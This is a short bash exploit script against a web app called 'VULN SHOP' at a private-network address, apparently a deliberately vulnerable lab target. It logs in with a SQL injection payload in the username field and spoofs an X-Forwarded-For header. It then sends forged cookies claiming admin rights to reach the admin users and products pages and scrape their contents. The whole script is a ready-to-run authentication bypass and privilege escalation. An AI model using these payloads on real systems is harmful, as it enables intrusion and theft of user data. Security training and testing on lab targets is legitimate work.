#!/bin/bash
# Cookie Manipulation to Admin Privilege Escalation
# Target: VULN SHOP

TARGET="http://10.210.136.53:3000"
MY_IP="10.0.0.101"

echo "[*] Cookie Manipulation - Admin Privilege Escalation"
echo "[*] Target: $TARGET"
echo ""

# Step 1: Login via SQL Injection
echo "[1] Logging in via SQL Injection..."
curl -s -c /tmp/session.txt -X POST \
    -H "X-Forwarded-For: $MY_IP" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=admin' OR '1'='1' --&password=anything" \
    "$TARGET/login" -i 2>&1 | grep "Set-Cookie"

echo ""

# Step 2: Access admin panel with manipulated cookie
echo "[2] Accessing admin panel with isAdmin=true..."
echo ""

echo "=== Admin Users Page ==="
curl -s -H "X-Forwarded-For: $MY_IP" \
    -H "Cookie: user=admin; isAdmin=true; user_id=1" \
    "$TARGET/admin/users" 2>&1 | grep -oP 'Username.*?</td>' | head -10

echo ""
echo "=== Admin Products Page ==="
curl -s -H "X-Forwarded-For: $MY_IP" \
    -H "Cookie: user=admin; isAdmin=true; user_id=1" \
    "$TARGET/admin/products" 2>&1 | grep -oP 'value="[^"]*"' | head -10
